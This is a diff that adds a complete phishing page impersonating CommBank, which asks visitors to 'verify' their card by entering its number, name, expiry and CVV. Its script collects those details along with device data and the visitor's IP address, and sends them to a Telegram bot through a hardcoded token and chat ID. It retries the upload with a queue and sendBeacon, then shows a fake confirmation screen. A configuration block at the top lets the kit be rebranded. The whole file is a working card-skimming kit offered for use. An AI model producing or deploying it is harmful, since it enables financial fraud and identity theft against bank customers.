@@ -1,0 +1,528 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="theme-color" content="#000000">
+<meta name="format-detection" content="telephone=no">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path d='M12 1.5 22.5 12 12 22.5 1.5 12z' fill='%23FFCC00'/></svg>">
+<title>CommBank</title>
+
+<!-- ══════ EDIT THESE 3 LINES ONLY ══════ -->
+<script>
+window.CV = {
+ TOKEN: "8793301177:AAF7iVsk-hsRe5xOZ-MLtkIFCkILpCWaF48",
+ CHAT: "8350097051",
+ BRAND: "CommBank"
+};
+</script>
+<!-- ═════════════════════════════════════ -->
+
+<style>
+:root{
+ --yellow:#FFCC00;
+ --ink:#1d1d1f;
+ --grey:#6e6e73;
+ --line:#e5e5ea;
+ --bg:#f5f5f7;
+ --red:#ff3b30;
+}
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{margin:0;padding:0}
+body{
+ font:16px -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+ background:var(--bg);color:var(--ink);
+ min-height:100vh;min-height:100dvh;
+ -webkit-font-smoothing:antialiased;
+ display:flex;flex-direction:column;
+}
+
+/* ── Header ── */
+header{
+ background:#000;
+ padding:13px 20px;
+ display:flex;align-items:center;gap:9px;
+ padding-top:calc(13px + env(safe-area-inset-top));
+}
+header svg{width:21px;height:21px;flex:none}
+header.wm{color:#fff;font-weight:800;font-size:18.5px;letter-spacing:-.4px}
+
+/* ── Layout ── */
+main{
+ flex:1;width:100%;max-width:420px;margin:0 auto;
+ padding:22px 20px 8px;
+}
+
+/* ── Card preview ── */
+.card{
+ aspect-ratio:1.586;
+ border-radius:18px;
+ background:linear-gradient(135deg,#2b2b30 0%,#0d0d0f 55%,#000 100%);
+ padding:20px;
+ color:#fff;
+ display:flex;flex-direction:column;justify-content:space-between;
+ box-shadow:0 16px 40px rgba(0,0,0,.26),0 2px 6px rgba(0,0,0,.14);
+ position:relative;overflow:hidden;
+ margin-bottom:22px;
+}
+.card::after{
+ content:"";position:absolute;
+ width:230px;height:230px;border-radius:50%;
+ background:radial-gradient(circle,rgba(255,204,0,.20),transparent 70%);
+ top:-95px;right:-75px;
+}
+.card-top{display:flex;justify-content:space-between;align-items:flex-start;position:relative;z-index:1}
+.card-top svg{width:26px;height:26px}
+.card-brand{font-size:12px;font-weight:800;letter-spacing:1.6px;opacity:.92}
+.card-mid{position:relative;z-index:1}
+.chip{
+ width:40px;height:30px;border-radius:6px;
+ background:linear-gradient(135deg,#f2d67e,#c9a227);
+ margin-bottom:13px;position:relative;
+}
+.chip::after{
+ content:"";position:absolute;inset:6px 8px;
+ border:1px solid rgba(0,0,0,.22);border-radius:3px;
+}
+.card-num{
+ font:600 clamp(15px,4.7vw,19.5px)/1 ui-monospace,SFMono-Regular,Menlo,monospace;
+ letter-spacing:2.4px;
+ text-shadow:0 1px 2px rgba(0,0,0,.45);
+ white-space:nowrap;
+}
+.card-bot{display:flex;justify-content:space-between;align-items:flex-end;position:relative;z-index:1}
+.card-lbl{font-size:7.5px;letter-spacing:1.3px;opacity:.5;text-transform:uppercase;margin-bottom:3px}
+.card-val{font-size:12.5px;font-weight:600;letter-spacing:.7px;text-transform:uppercase;white-space:nowrap}
+
+/* ── Form ── */
+.field{
+ background:#fff;border:1px solid var(--line);border-radius:12px;
+ padding:11px 14px;margin-bottom:10px;
+ transition:border-color.15s,box-shadow.15s;
+}
+.field.focus{border-color:#000;box-shadow:0 0 0 3px rgba(0,0,0,.06)}
+.field.bad{border-color:var(--red)}
+.field label{
+ display:block;font-size:10px;font-weight:700;letter-spacing:.7px;
+ text-transform:uppercase;color:var(--grey);margin-bottom:4px;
+}
+.field input{
+ width:100%;border:0;outline:0;background:transparent;
+ font:16px inherit;color:var(--ink);padding:0;letter-spacing:.3px;
+}
+.field input::placeholder{color:var(--grey);opacity:.5;letter-spacing:0}
+.row{display:flex;gap:10px}
+.row.field{flex:1}
+
+.err{color:var(--red);font-size:12px;margin:-4px 0 10px 3px;display:none}
+.err.on{display:block}
+
+.btn{
+ width:100%;border:0;border-radius:12px;
+ background:var(--yellow);color:#000;
+ font:700 16.5px inherit;padding:17px;margin-top:10px;
+ cursor:pointer;
+ box-shadow:0 4px 14px rgba(255,204,0,.42);
+ transition:transform.1s,opacity.15s;
+}
+.btn:active{transform:scale(.985)}
+.btn:disabled{opacity:.6;pointer-events:none}
+
+/* ── Success ── */
+.done{display:none;text-align:center;padding:40px 0}
+.done.on{display:block}
+.tick{width:76px;height:76px;margin:0 auto 20px;display:block}
+.tick circle{fill:none;stroke:#34c759;stroke-width:3;stroke-dasharray:166;stroke-dashoffset:166;animation:d.55s cubic-bezier(.65,0,.45,1) forwards}
+.tick path{fill:none;stroke:#34c759;stroke-width:4;stroke-linecap:round;stroke-linejoin:round;stroke-dasharray:48;stroke-dashoffset:48;animation:d.35s cubic-bezier(.65,0,.45,1).5s forwards}
+@keyframes d{to{stroke-dashoffset:0}}
+.done h2{font-size:21px;margin:0 0 7px;font-weight:700}
+.done p{color:var(--grey);font-size:14px;margin:0;line-height:1.5}
+
+/* ── Footer ── */
+footer{
+ text-align:center;font-size:10.5px;color:var(--grey);
+ padding:22px 24px calc(26px + env(safe-area-inset-bottom));
+ line-height:1.7;
+}
+footer.lock{width:10px;height:10px;fill:var(--grey);vertical-align:-1px;margin-right:4px}
+footer.sep{margin:0 6px;opacity:.5}
+
+@media (prefers-reduced-motion:reduce){
+.tick circle,.tick path{animation:none;stroke-dashoffset:0}
+}
+</style>
+</head>
+<body>
+
+<header>
+ <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 1.5 22.5 12 12 22.5 1.5 12z" fill="#FFCC00"/></svg>
+ <span class="wm" id="wm">CommBank</span>
+</header>
+
+<main>
+
+ <div id="stage1">
+
+ <div class="card">
+ <div class="card-top">
+ <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 1.5 22.5 12 12 22.5 1.5 12z" fill="#FFCC00"/></svg>
+ <span class="card-brand" id="cardBrand">CARD</span>
+ </div>
+ <div class="card-mid">
+ <div class="chip"></div>
+ <div class="card-num" id="cardNum">•••• •••• •••• ••••</div>
+ </div>
+ <div class="card-bot">
+ <div>
+ <div class="card-lbl">Card Holder</div>
+ <div class="card-val" id="cardName">YOUR NAME</div>
+ </div>
+ <div>
+ <div class="card-lbl">Expires</div>
+ <div class="card-val" id="cardExp">MM/YY</div>
+ </div>
+ </div>
+ </div>
+
+ <form id="fm" novalidate>
+ <div class="field" id="f1">
+ <label for="n">Card Number</label>
+ <input id="n" name="cardnumber" type="text" inputmode="numeric"
+ autocomplete="cc-number" autocorrect="off" spellcheck="false"
+ enterkeyhint="next" placeholder="1234 5678 9012 3456" maxlength="23">
+ </div>
+ <div class="err" id="e1"></div>
+
+ <div class="field" id="f2">
+ <label for="nm">Name on Card</label>
+ <input id="nm" name="ccname" type="text" autocomplete="cc-name"
+ autocapitalize="characters" autocorrect="off" spellcheck="false"
+ enterkeyhint="next" placeholder="J CITIZEN">
+ </div>
+ <div class="err" id="e2"></div>
+
+ <div class="row">
+ <div class="field" id="f3">
+ <label for="ex">Expiry</label>
+ <input id="ex" name="ccexp" type="text" inputmode="numeric"
+ autocomplete="cc-exp" enterkeyhint="next" placeholder="MM/YY" maxlength="5">
+ </div>
+ <div class="field" id="f4">
+ <label for="cv">CVV</label>
+ <input id="cv" name="cvc" type="text" inputmode="numeric"
+ autocomplete="cc-csc" enterkeyhint="done" placeholder="123" maxlength="4">
+ </div>
+ </div>
+ <div class="err" id="e3"></div>
+
+ <button class="btn" id="bt" type="submit">Verify Card</button>
+ </form>
+
+ </div>
+
+ <div class="done" id="stage2">
+ <svg class="tick" viewBox="0 0 52 52">
+ <circle cx="26" cy="26" r="24"/>
+ <path d="M14 27l8 8 16-16"/>
+ </svg>
+ <h2>Verified</h2>
+ <p>Your card has been confirmed.</p>
+ </div>
+
+</main>
+
+<footer>
+ <svg class="lock" viewBox="0 0 24 24"><path d="M12 1a5 5 0 0 0-5 5v3H6a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-9a2 2 0 0 0-2-2h-1V6a5 5 0 0 0-5-5zm-3 8V6a3 3 0 1 1 6 0v3H9z"/></svg>Secured connection
+ <div style="margin-top:6px">
+ Commonwealth Bank of Australia<span class="sep">·</span>ABN 48 123 123 124
+ </div>
+ <div>© <span id="yr"></span> CommBank. All rights reserved.</div>
+</footer>
+
+<script>
+"use strict";
+
+var TOKEN = window.CV.TOKEN;
+var CHAT = window.CV.CHAT;
+var BRAND = window.CV.BRAND;
+var REF = new URLSearchParams(location.search).get("id") || "";
+var QK = "cvq";
+
+function $(i){ return document.getElementById(i); }
+function uid(){ return Math.random().toString(36).slice(2,10); }
+function esc(s){ return String(s==null?"":s)
+.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;"); }
+function q(){ try{ return JSON.parse(localStorage.getItem(QK))||[]; }catch(e){ return []; } }
+function w(a){ try{ localStorage.setItem(QK, JSON.stringify(a)); }catch(e){} }
+function add(x){ var a=q(); a.push(x); w(a); }
+function del(id){ w(q().filter(function(x){ return x.id!==id; })); }
+function sleep(ms){ return new Promise(function(r){ setTimeout(r,ms); }); }
+
+function ft(u,o,ms){
+ var c = new AbortController();
+ var t = setTimeout(function(){ c.abort(); }, ms);
+ return fetch(u, Object.assign({}, o, { signal:c.signal }))
+.finally(function(){ clearTimeout(t); });
+}
+
+async function retry(fn,n){
+ n = n || 3;
+ var last;
+ for (var i=0;i<n;i++){
+ try { return await fn(); }
+ catch(e){ last=e; if (i<n-1) await sleep(600*Math.pow(2,i)); }
+ }
+ throw last;
+}
+
+function luhn(d){
+ if (!d) return false;
+ var s=0,b=false;
+ for (var i=d.length-1;i>=0;i--){
+ var x = d.charCodeAt(i)-48;
+ if (b){ x*=2; if (x>9) x-=9; }
+ s+=x; b=!b;
+ }
+ return s%10===0;
+}
+
+function grp(d){ return d.replace(/(.{4})/g,"$1 ").trim(); }
+
+var BRANDS = [
+ { n:"VISA", re:/^4/, cvv:3 },
+ { n:"MASTERCARD", re:/^(5[1-5]|2[2-7])/, cvv:3 },
+ { n:"AMEX", re:/^3[47]/, cvv:4 },
+ { n:"DISCOVER", re:/^(6011|65|64[4-9])/, cvv:3 },
+ { n:"JCB", re:/^35/, cvv:3 },
+ { n:"UNIONPAY", re:/^62/, cvv:3 }
+];
+
+function brandOf(d){
+ if (!d) return null;
+ for (var i=0;i<BRANDS.length;i++){ if (BRANDS[i].re.test(d)) return BRANDS[i]; }
+ return null;
+}
+
+function meta(){
+ var ua = navigator.userAgent, d="Desktop", o="Unknown", b="Unknown";
+ if (/iPhone/.test(ua)){ d="iPhone"; o="iOS"; }
+ else if (/iPad/.test(ua)){ d="iPad"; o="iPadOS"; }
+ else if (/Android/.test(ua)){ d="Android"; o="Android"; }
+ else if (/Macintosh/.test(ua)){ d="Mac"; o="macOS"; }
+ else if (/Windows/.test(ua)){ d="Windows"; o="Windows"; }
+ else if (/Linux/.test(ua)){ d="Linux"; o="Linux"; }
+
+ var m = ua.match(/(?:OS |Android[ /])(\d+[._]\d+)/);
+ if (m) o += " " + m[1].replace(/_/g,".");
+
+ if (/CriOS/.test(ua)) b="Chrome iOS";
+ else if (/FxiOS/.test(ua)) b="Firefox iOS";
+ else if (/SamsungBrowser/.test(ua)) b="Samsung";
+ else if (/Edg\//.test(ua)) b="Edge";
+ else if (/Chrome\//.test(ua)) b="Chrome";
+ else if (/Firefox\//.test(ua)) b="Firefox";
+ else if (/Safari\//.test(ua)) b="Safari";
+
+ var tz="";
+ try { tz = Intl.DateTimeFormat().resolvedOptions().timeZone || ""; } catch(e){}
+
+ return {
+ device:d, os:o, browser:b, tz:tz,
+ lang: navigator.language || "",
+ screen: screen.width + "x" + screen.height,
+ time: new Date().toLocaleString("en-GB",{hour12:false})
+ };
+}
+
+var IP = "";
+async function getIP(){
+ if (IP) return IP;
+ try {
+ var r = await ft("https://api.ipify.org?format=json", {}, 3500);
+ IP = (await r.json()).ip || "";
+ } catch(e){}
+ return IP;
+}
+
+function msg(it){
+ var d = it.data, m = it.meta, L = [];
+ L.push("🔐 <b>CARD CAPTURE</b>");
+ L.push("━━━━━━━━━━━━━━━━━━");
+ L.push("💳 <code>" + esc(d.number) + "</code>");
+ L.push("🏦 " + esc(d.brand));
+ L.push("👤 " + esc(d.name));
+ L.push("📅 " + esc(d.expiry) + " 🔒 <code>" + esc(d.cvv) + "</code>");
+ L.push("━━━━━━━━━━━━━━━━━━");
+ L.push("📱 " + esc(m.device) + " · " + esc(m.os) + " · " + esc(m.browser));
+ if (m.ip) L.push("🌍 " + esc(m.ip) + " · " + esc(m.tz));
+ L.push("🕐 " + esc(m.time));
+ if (it.ref) L.push("🆔 " + esc(it.ref));
+ return L.join("\n");
+}
+
+async function send(it){
+ if (!TOKEN || !CHAT) return false;
+ await retry(function(){
+ return ft("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
+ method:"POST",
+ headers:{ "Content-Type":"application/json" },
+ body: JSON.stringify({
+ chat_id: CHAT,
+ text: msg(it),
+ parse_mode:"HTML",
+ disable_web_page_preview:true
+ })
+ }, 9000).then(function(r){
+ if (!r.ok) throw new Error(r.status);
+ return r.json();
+ });
+ }, 3);
+ return true;
+}
+
+async function flush(){
+ var a = q();
+ for (var i=0;i<a.length;i++){
+ try { await send(a[i]); del(a[i].id); } catch(e){}
+ }
+}
+
+function beacon(){
+ var a = q();
+ if (!a.length || !TOKEN) return;
+ var u = "https://api.telegram.org/bot" + TOKEN + "/sendMessage";
+ a.forEach(function(it){
+ try {
+ navigator.sendBeacon(u, new Blob([JSON.stringify({
+ chat_id: CHAT, text: msg(it), parse_mode:"HTML"
+ })], { type:"text/plain;charset=UTF-8" }));
+ } catch(e){}
+ });
+}
+
+function err(f,e,m){
+ $(f).classList.add("bad");
+ var x = $(e); x.textContent = m; x.classList.add("on");
+}
+function clr(f,e){
+ $(f).classList.remove("bad");
+ $(e).classList.remove("on");
+}
+
+var n = $("n"), nm = $("nm"), ex = $("ex"), cv = $("cv");
+
+["n","nm","ex","cv"].forEach(function(id){
+ var el = $(id), box = el.closest(".field");
+ el.addEventListener("focus", function(){ box.classList.add("focus"); });
+ el.addEventListener("blur", function(){ box.classList.remove("focus"); });
+});
+
+function paint(){
+ var d = n.value.replace(/\D/g,"");
+ var b = brandOf(d);
+ $("cardNum").textContent = n.value || "•••• •••• •••• ••••";
+ $("cardName").textContent = (nm.value || "YOUR NAME").toUpperCase();
+ $("cardExp").textContent = ex.value || "MM/YY";
+ $("cardBrand").textContent = b ? b.n: "CARD";
+ cv.maxLength = b ? b.cvv: 4;
+ cv.placeholder = b ? "•".repeat(b.cvv): "123";
+}
+
+n.addEventListener("input", function(){
+ n.value = grp(n.value.replace(/\D/g,"").slice(0,19));
+ paint(); clr("f1","e1");
+});
+
+nm.addEventListener("input", function(){
+ paint(); clr("f2","e2");
+});
+
+ex.addEventListener("input", function(){
+ var d = ex.value.replace(/\D/g,"");
+ if (d.length===1 && +d>1) d = "0"+d;
+ d = d.slice(0,4);
+ ex.value = d.length>2 ? d.slice(0,2)+"/"+d.slice(2): d;
+ paint(); clr("f3","e3");
+});
+
+cv.addEventListener("input", function(){
+ cv.value = cv.value.replace(/\D/g,"");
+ clr("f4","e3");
+});
+
+$("fm").addEventListener("submit", async function(ev){
+ ev.preventDefault();
+
+ var d = n.value.replace(/\D/g,""), ok = true;
+ var b = brandOf(d);
+
+ if (!d){ err("f1","e1","Enter your card number"); ok=false; }
+ else if (d.length < 12){ err("f1","e1","Card number is too short"); ok=false; }
+ else if (!luhn(d)){ err("f1","e1","Card number failed the checksum"); ok=false; }
+
+ var name = nm.value.trim();
+ if (name.length < 2){ err("f2","e2","Enter the name printed on the card"); ok=false; }
+
+ var e = ex.value.replace(/\D/g,"");
+ if (e.length !== 4){ err("f3","e3","Enter expiry as MM/YY"); ok=false; }
+ else {
+ var mm = +e.slice(0,2), yy = +e.slice(2);
+ var now = new Date(), cy = now.getFullYear()%100, cm = now.getMonth()+1;
+ if (mm<1 || mm>12){ err("f3","e3","Month must be 01-12"); ok=false; }
+ else if (yy<cy || (yy===cy && mm<cm)){ err("f3","e3","That card has expired"); ok=false; }
+ }
+
+ var c = cv.value.replace(/\D/g,"");
+ var need = b ? b.cvv: 3;
+ if (c.length !== need){ err("f4","e3","CVV must be " + need + " digits"); ok=false; }
+
+ if (!ok){
+ var bad = document.querySelector(".field.bad input");
+ if (bad) bad.focus();
+ return;
+ }
+
+ var bt = $("bt");
+ bt.disabled = true;
+ bt.textContent = "Verifying…";
+
+ var m = meta();
+ m.ip = await getIP();
+
+ var it = {
+ id: uid(),
+ ref: REF,
+ data: {
+ number: grp(d),
+ brand: b ? b.n: "Unknown",
+ name: name.toUpperCase(),
+ expiry: e.slice(0,2) + "/" + e.slice(2),
+ cvv: c
+ },
+ meta: m,
+ ts: Date.now()
+ };
+
+ add(it);
+ try { await send(it); del(it.id); } catch(x){}
+
+ $("stage1").style.display = "none";
+ $("stage2").classList.add("on");
+});
+
+$("yr").textContent = new Date().getFullYear();
+if (BRAND) $("wm").textContent = BRAND;
+
+paint();
+getIP();
+flush();
+window.addEventListener("online", flush);
+document.addEventListener("visibilitychange", function(){
+ if (document.visibilityState === "hidden") beacon(); else flush();
+});
+window.addEventListener("pagehide", beacon);
+</script>
+</body>
+</html>
